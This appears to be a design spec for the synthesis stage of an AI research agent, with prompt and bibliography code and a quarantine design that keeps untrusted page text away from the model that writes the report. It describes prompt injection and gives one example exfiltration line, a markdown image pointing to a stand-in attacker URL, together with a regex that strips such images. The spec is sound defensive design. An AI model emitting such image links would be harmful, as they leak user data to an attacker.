# 08 — Synthesis

**Priority: P0.**

## Purpose

Compose verified claims into a report where **every citation was checked before it
was written**. Synthesis does not get to introduce new facts.

## The constraint that makes this different

The synthesis model sees **only verified claims and their quotes** — never raw
page text. Two reasons:

1. **Grounding.** If the model can't see the source, it can't smuggle in an
   unverified assertion attributed to it.
2. **Injection containment.** This is the privileged half of the split described
   in spec 05. Untrusted content reaches extraction (quarantined, datamarked,
   no tools). Synthesis (which writes the output the human reads) never touches
   it. Compromising the report then requires an injection to survive extraction
   *and* verification.

That is a weaker version of the dual-LLM / CaMeL pattern — worth naming as the
inspiration, and worth being clear that it's weaker: a claim that passes both
gates still carries the adversary's framing.

```python
# nodes/synthesize.py
SYNTH_PROMPT = """Write a research report answering the question.

QUESTION: {question}
BRIEF: {brief}

VERIFIED CLAIMS — each was checked against its source. Cite with [n].
{claims_block}

UNVERIFIED / REJECTED — do NOT state these as fact.
{rejected_block}

OPEN UNCERTAINTIES:
{uncertainty_block}

Rules:
- Every factual sentence carries a [n] citation.
- Use ONLY the verified claims. You may not add facts from your own knowledge.
- Where claims conflict, say so explicitly rather than picking one.
- End with a "Limitations" section naming what could not be verified.
- If the verified claims do not answer the question, say that plainly. An honest
  partial answer beats a padded complete-looking one."""


def synthesize_node(state, *, llm):
    supported = [c for c in state["claims"] if c.verdict == "supported"]
    rejected  = [c for c in state["claims"] if c.verdict != "supported"]

    by_source = {s.source_id: (i + 1, s) for i, s in enumerate(state["sources"])}

    claims_block = "\n".join(
        f"[{by_source[c.quotes[0].source_id][0]}] {c.text}\n"
        f"    evidence: \"{c.quotes[0].text[:200]}\""
        for c in supported if c.quotes
    )
    rejected_block = "\n".join(
        f"- {c.text}  (rejected: {c.verdict} — {c.verdict_reason})" for c in rejected
    ) or "none"

    report = llm.invoke(SYNTH_PROMPT.format(
        question=state["question"], brief=state["brief"],
        claims_block=claims_block, rejected_block=rejected_block,
        uncertainty_block="\n".join(f"- {u.description}" for u in state["uncertainties"]) or "none",
    )).text

    return {"report": report + "\n\n" + render_bibliography(by_source, state),
            "trace": [ev("report", n_supported=len(supported), n_rejected=len(rejected))]}
```

## Bibliography

Include the verification status, so a reader can see what the agent checked and
what it discarded rather than only what survived.

```python
def render_bibliography(by_source, state) -> str:
    lines = ["## Sources"]
    for sid, (n, s) in sorted(by_source.items(), key=lambda kv: kv[1][0]):
        used = sum(1 for c in state["claims"]
                   if c.verdict == "supported" and c.quotes
                   and c.quotes[0].source_id == sid)
        lines.append(f"[{n}] {s.title} — {s.url}  ({used} verified claim(s))")

    n_ok = sum(1 for c in state["claims"] if c.verdict == "supported")
    n_all = len(state["claims"])
    lines += ["", "## Verification",
              f"{n_ok}/{n_all} extracted claims passed verification "
              f"({n_ok / max(n_all, 1):.0%})."]
    return "\n".join(lines)
```

## Rendering — one security rule

**Never emit auto-loading images.** The classic exfiltration vector is an injected
instruction that produces `![](https://attacker/?d=<data>)`; a UI that renders it
fires the GET. Strip image syntax at render time, not by asking the model not to
produce it.

```python
IMG = re.compile(r"!\[[^\]]*\]\([^)]*\)")

def safe_render(md: str) -> str:
    return IMG.sub("[image removed]", md)
```

Belt and braces: the model was never shown raw page content, *and* the renderer
strips images anyway. Defense in depth is the point.

## Handling conflicts

When two supported claims disagree, do not let the model quietly pick one. Detect
it before synthesis and pass it in explicitly:

```python
# cheap version: same topic_id, opposite-polarity claims -> flag for the prompt
conflicts = detect_conflicts(supported)     # LLM pass or heuristic
```

The prompt rule ("where claims conflict, say so") is the cheap version and it
covers most cases. Structured conflict detection is the upgrade: representing
disagreement rather than resolving it is what separates a research report from an
answer, and doing it reliably needs an explicit pass rather than an instruction.

## Acceptance

- Every factual sentence has a `[n]`.
- No citation points to a claim with `verdict != "supported"`.
- Rejected claims appear in Limitations, not the body.
- The verification ratio is rendered.
- No markdown images survive rendering.
